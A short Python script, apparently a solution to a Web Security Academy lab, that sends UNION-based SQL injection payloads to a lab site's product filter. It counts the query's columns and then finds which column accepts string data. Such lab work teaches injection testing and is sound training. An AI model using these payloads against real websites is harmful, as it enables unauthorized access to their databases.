#!/usr/bin/env python3

import requests

url = "https://0a4600bb04e3c17586ed6b69004d003d.web-security-academy.net/filter"
params = {"category": "Gifts' UNION SELECT NULL, NULL, NULL--"}

response = requests.get(url, params=params)

# now that we know Gifts contains three columns, let's test which is compatible
# with String data type
for i in range(3):
    stmt = ["NULL"] * 3
    stmt[i] = "'h79BnZ'"

    params = {"category": f"Gifts' UNION SELECT {','.join(stmt)}--"}

    response = requests.get(url, params=params)

    if response.status_code == requests.codes.ok:
        print(f"the position of 'h79BnZ' is {i+1}")
        print(response.url)
